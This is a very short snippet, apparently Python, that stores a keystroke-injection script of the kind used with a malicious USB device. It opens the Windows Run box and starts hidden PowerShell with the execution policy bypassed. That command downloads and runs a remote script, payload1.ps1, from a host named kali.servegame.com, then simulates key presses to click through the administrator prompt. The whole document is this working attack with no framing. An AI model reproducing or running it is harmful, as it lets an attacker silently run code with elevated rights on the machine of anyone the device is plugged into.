data = """\RUNBOX
powershell.exe -executionpolicy bypass -w hidden "iex(New-Object System.Net.WebClient).DownloadString('http://kali.servegame.com:8000/payload1.ps1'); payload1.ps1"
\ADMINPRESS
\SLEEP 0.5
\LEFTARROW
\ENTER"""

